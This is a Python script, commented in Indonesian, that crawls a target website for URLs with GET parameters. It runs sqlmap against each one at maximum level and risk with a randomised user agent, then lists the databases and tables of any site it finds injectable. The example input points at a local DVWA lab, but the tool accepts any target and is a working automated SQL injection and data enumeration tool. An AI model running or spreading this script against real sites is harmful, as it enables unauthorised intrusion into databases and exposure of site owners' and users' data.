import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# Konfigurasi
CRAWL_LIMIT = 100        # Batas halaman yang di-crawl
MAX_THREADS = 10         # Jumlah thread paralel
SQLMAP_PATH = "sqlmap"   # Pastikan sqlmap ada di PATH

VISITED = set()
URLS_WITH_PARAMS = []
FOUND_TABLES = {}  # {url: {db: [tabel1, tabel2]}}

def crawl(url, target_domain):
    """Merayapi URL dan mencari parameter GET"""
    if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
        return
    try:
        response = requests.get(url, timeout=5)
    except:
        return

    VISITED.add(url)
    print(f"[Crawl] {url}")

    soup = BeautifulSoup(response.text, "html.parser")
    for link_tag in soup.find_all("a", href=True):
        link = urljoin(url, link_tag["href"])
        parsed = urlparse(link)

        if target_domain in link and link not in VISITED:
            if parsed.query:  # Ada parameter GET
                URLS_WITH_PARAMS.append(link)
            crawl(link, target_domain)

def run_sqlmap_command(cmd):
    """Menjalankan SQLMap dan mengembalikan output"""
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

def test_sqlmap(url):
    """Menguji URL dengan SQLMap"""
    print(f"\n[+] Menguji kerentanan SQLi: {url}")
    check_cmd = [
        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--random-agent"
    ]
    result = run_sqlmap_command(check_cmd)

    if re.search(r"the back-end DBMS", result, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi ditemukan: {url}")
        find_tables(url)
    else:
        print(f"[-] Tidak rentan: {url}")

def find_tables(url):
    """Mencari semua tabel dari database"""
    dbs_output = run_sqlmap_command([
        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--dbs"
    ])
    db_list = re.findall(r"[*]\s+(\w+)", dbs_output)

    if url not in FOUND_TABLES:
        FOUND_TABLES[url] = {}

    for db in db_list:
        tables_output = run_sqlmap_command([
            SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "-D", db, "--tables"
        ])
        tables = re.findall(r"[*]\s+(\w+)", tables_output)
        FOUND_TABLES[url][db] = tables

if __name__ == "__main__":
    # Input URL target dari user
    TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
    if not TARGET.startswith("http"):
        print("[!] URL harus diawali http:// atau https://")
        exit()

    TARGET_DOMAIN = urlparse(TARGET).netloc

    print("[*] Mulai crawling...")
    crawl(TARGET, TARGET_DOMAIN)

    print(f"\n[!] Total URL dengan parameter ditemukan: {len(URLS_WITH_PARAMS)}")

    # Uji semua URL dengan multi-thread
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_sqlmap, url) for url in URLS_WITH_PARAMS]
        for future in as_completed(futures):
            future.result()

    # Ringkasan hasil akhir
    print("\n" + "="*60)
    print("📊 RINGKASAN TABEL DITEMUKAN")
    print("="*60)
    if not FOUND_TABLES:
        print("Tidak ada tabel ditemukan atau target tidak rentan.")
    else:
        for target_url, db_info in FOUND_TABLES.items():
            print(f"\nTarget: {target_url}")
            for db, tables in db_info.items():
                print(f"  Database: {db}")
                for t in tables:
                    print(f"    - {t}")
